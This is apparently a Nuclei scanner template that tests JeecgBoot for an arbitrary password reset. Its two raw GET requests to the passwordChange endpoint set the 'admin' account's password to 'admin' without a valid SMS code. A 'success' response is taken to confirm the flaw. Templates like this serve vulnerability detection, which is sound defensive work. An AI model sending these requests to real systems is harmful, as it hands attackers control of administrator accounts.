
id: jeecgboot-password-reset

info:
  name: JeecgBoot Arbitrary User Password Reset
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template checks for an arbitrary password reset vulnerability in JeecgBoot via the `passwordChange` endpoint.

http:
  - raw:
      - |
        GET /jeecg-boot/sys/user/passwordChange?username=admin&password=admin&smscode=&phone= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"success":true' # Match response containing `"success":true` to confirm vulnerability
        part: body

  - raw:
      - |
        GET /sys/user/passwordChange?username=admin&password=admin&smscode=&phone= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"success":true' # Match response containing `"success":true` to confirm vulnerability
        part: body

variables:
  Hostname: "{{BaseURL}}"